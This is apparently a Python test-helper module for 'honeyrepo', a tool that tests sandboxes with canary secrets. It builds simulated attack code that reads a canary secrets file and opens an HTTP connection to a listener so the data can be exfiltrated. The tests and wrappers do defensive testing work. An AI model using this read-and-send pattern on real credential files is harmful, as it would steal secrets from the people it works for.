"""Helpers shared by the tests."""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

import honeyrepo
from honeyrepo.scenario import Scenario, parse

# The package that is being tested: the source tree, an editable install, or an installed copy.
SRC = Path(honeyrepo.__file__).resolve().parent
# The repository (pyproject.toml, docs/, README.md). It is found from the tests directory, not from the
# package: with `pip install .` the package lives in site-packages, far away from the repository.
ROOT = Path(__file__).resolve().parent.parent
DEMO_WRAPPER = SRC / "demo_block_network.py"
IS_POSIX = os.name == "posix"
IS_ROOT = IS_POSIX and os.geteuid() == 0

PRELUDE = "import base64, gzip, http.client, json, os, socket, subprocess, sys, time, urllib.parse, zlib\n"
SECRET = "d = open(os.environ['HONEYREPO_CANARY_FILE'], 'rb').read()\n"
OPEN = (
    "u = urllib.parse.urlsplit(os.environ['HONEYREPO_LISTENER'])\n"
    "c = http.client.HTTPConnection(u.hostname, u.port, timeout=5)\n"
)


def emit(**fields) -> str:
    """Python source that prints one stage line, as the built-in attacker does."""
    return f"print('HONEYREPO-STAGE ' + json.dumps({fields!r}), flush=True)\n"


def exfil(request_code: str) -> str:
    """Attack code: read the canary file, then run `request_code` (which may use `d`, `c`, `u`)."""
    return PRELUDE + SECRET + OPEN + request_code + "\n"


def custom(code: str, *, template: str = "API_KEY={canary}\n", name: str = "custom") -> Scenario:
    """A scenario whose attack is `code`, run with the Python that runs the tests."""
    text = (
        f'id = "{name}"\ntitle = "test scenario"\n'
        '[bait.files]\n"README.md" = "bait"\n'
        f'[canary]\npath = ".env"\ntemplate = {json.dumps(template, ensure_ascii=False)}\n'
        f'[attack]\ncommand = ["{{python}}", "-c", {json.dumps(code, ensure_ascii=False)}]\n'
    )
    return parse(text, "test")


def write_script(directory: Path, name: str, source: str) -> str:
    path = directory / name
    path.write_text(source, encoding="utf-8")
    return str(path)


# Wrapper scripts used to imitate sandbox behaviour without needing a real sandbox.
REMOVE_THEN_RUN = (
    "import os, subprocess, sys\n"
    "args = sys.argv[1:]\n"
    "split = args.index('--')\n"
    "for target in args[:split]:\n"
    "    os.remove(target)\n"
    "sys.exit(subprocess.call(args[split + 1:]))\n"
)
DENY_THEN_RUN = (
    "import os, subprocess, sys\n"
    "args = sys.argv[1:]\n"
    "split = args.index('--')\n"
    "for target in args[:split]:\n"
    "    os.chmod(target, 0)\n"
    "sys.exit(subprocess.call(args[split + 1:]))\n"
)


def process_is_alive(pid: int) -> bool:
    """True if the process exists and is not a zombie (Linux; elsewhere, plain kill-0)."""
    status = Path(f"/proc/{pid}/status")
    if status.exists():
        for line in status.read_text().splitlines():
            if line.startswith("State:"):
                return "Z" not in line.split(":", 1)[1].split()[0]
        return True
    try:
        os.kill(pid, 0)
    except OSError:
        return False
    return True


PYTHON = sys.executable
